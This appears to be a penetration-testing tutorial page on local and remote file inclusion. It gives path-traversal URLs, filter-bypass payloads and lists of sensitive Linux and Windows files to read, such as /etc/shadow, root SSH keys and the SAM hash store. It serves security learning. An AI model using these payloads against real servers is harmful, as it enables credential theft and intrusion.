# File Inclusion

**File Inclusion** vulnerabilities allow an attacker to **include files on a server through a web application's input**. \
This happens when the application uses user input to construct paths to files and then includes those files in the execution process, without proper validation or sanitization.



There are two main types:

## Local File Inclusion (LFI) - Path Traversal

The **Local File Include** vulnerability is a web vulnerbility that allows a hacker to read/view sensitive information **already present on the server**.

In practice, the follow URL may be affected by LFI vulnerability:

```
https://company.com/download?ticket=3123345123-345345123.json
```

We see that we can change the variable indicating the file to be displayed. Try to change it with a local file with possible sensitive information:

```
https://company.com/download?ticket=../../../../../../etc/passwd
```

This URL will display the entire file content.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
[..snip..]
```



### Bypass Payloads

{% code title="Manual" overflow="wrap" %}
```bash
../../../../../../etc/passwd # bypass include php function
../../../../../../etc/passwd%00 # set NULL BYTE at the end to bypass file type and bypass Blacklist filter, not working with PHP 5.3.4 and above
....//....//....//....//....//etc/passwd # bypass ./ replaces by empty string

```
{% endcode %}

{% code title="Files" %}
```
```
{% endcode %}

### Sensitive file to get

{% code title="Linux Web Server" %}
```bash
/etc/passwd # system's user
/etc/shadow # system's password 
/etc/hosts # may contain subdomain
/etc/issue # 
/etc/profile # controls system-wide default variables
/proc/version # specifies the version of the Linux kernel
/root/.bash_history
/var/log/apache2/access.log # may contain credentials
/var/log/auth.log # ssh logon
/var/log/secure # admin activities
/var/log/dmessage # contains global system messages
/var/mail/root
/root/.ssh/id_rsa # private ssh keys for a root or other accounts

```
{% endcode %}

{% code title="Windows Web Server" %}
```bash
C:\Windows\System32\drivers\etc\hosts # other domain and subdomain
C:\Windows\System32\config\SAM # password hashes 
C:\inetpub\logs\LogFiles\W3SVC1\*.log # IIS log
C:\Users\Administrator\Desktop\* # admin files
C:\boot.ini # contains the boot options with BIOS firmware
```
{% endcode %}



## Remote File Inclusion (RFI)

**Remote File Inclusion (RFI)** is a technique to include remote files into a vulnerable application. \
Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

* Sensitive Information Disclosure
* Cross-site Scripting (XSS)
* Denial of Service (DoS)





